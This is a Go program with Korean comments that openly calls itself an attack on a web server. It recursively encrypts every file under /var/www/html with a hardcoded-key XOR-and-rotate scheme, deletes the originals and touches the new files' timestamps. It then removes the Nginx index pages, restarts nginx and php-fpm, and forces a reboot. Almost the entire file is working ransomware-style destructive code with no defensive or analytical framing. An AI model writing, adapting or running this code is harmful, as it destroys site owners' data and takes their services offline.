package main

import (
	"crypto/sha256"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func main() {
	// =========================================================
	// 1.암호화 로직
	// =========================================================
	targetDir := "/var/www/html/"
	encryptionKey := "HYEONSU_MAX_SECURITY_KEY_2026_@!"

	// 키를 SHA256으로 해싱해서 더 강력한 32바이트 키 생성
	hash := sha256.Sum256([]byte(encryptionKey))
	finalKey := hash[:]

	log.Printf("🚀 공격 시작 타겟: %s\n", targetDir)

	err := filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}

		// 이미 암호화된 파일은 건너뜀
		if filepath.Ext(path) == ".encrypted" {
			return nil
		}

		// 파일 읽기
		content, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		log.Printf("[ING] Encrypting: %s (Size: %d bytes)", info.Name(), info.Size())

		// 암호화 루프
		encryptedData := make([]byte, len(content))
		for i := 0; i < len(content); i++ {
			temp := content[i] ^ finalKey[i%len(finalKey)]
			temp = (temp << 3) | (temp >> 5)
			encryptedData[i] = ^temp
		}

		// 파일 쓰기 및 원본 삭제
		newPath := path + ".encrypted"
		err = ioutil.WriteFile(newPath, encryptedData, 0644)
		if err == nil {
			os.Remove(path)
			// 타임스톰핑 (시간 조작)
			currentTime := time.Now().Local()
			os.Chtimes(newPath, currentTime, currentTime)
		}

		return nil
	})

	if err != nil {
		log.Fatalf("❌ 공격 중 에러 발생: %v", err)
	}

	// =========================================================
	// 2. [추가됨] 확인 사살 (파일 삭제 -> 재시작 -> 종료)
	// =========================================================
	
	fmt.Println("\n==================================================")
	fmt.Println("🗑️  Cleaning up default Nginx pages...")
	 // Nginx 기본 페이지 강제 삭제 (에러 무시하고 실행)
	exec.Command("rm", "-f", "/var/www/html/index.nginx-debian.html").Run()
	exec.Command("rm", "-f", "/var/www/html/index.html").Run()

	fmt.Println("🔄 Restarting Web Services (Clear Cache)...")
	 // 서비스 재시작
	exec.Command("systemctl", "restart", "nginx").Run()
	exec.Command("systemctl", "restart", "php8.1-fpm").Run()

	fmt.Println("🚨 ATTACK COMPLETE: SYSTEM WILL SHUTDOWN IN 3 SECONDS...")
	fmt.Println("==================================================")

	 // 로그를 볼 시간을 주기 위해 3초 대기
	time.Sleep(3 * time.Second)

	 // 시스템 부팅
	cmd := exec.Command("shutdown", "-r", "now")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}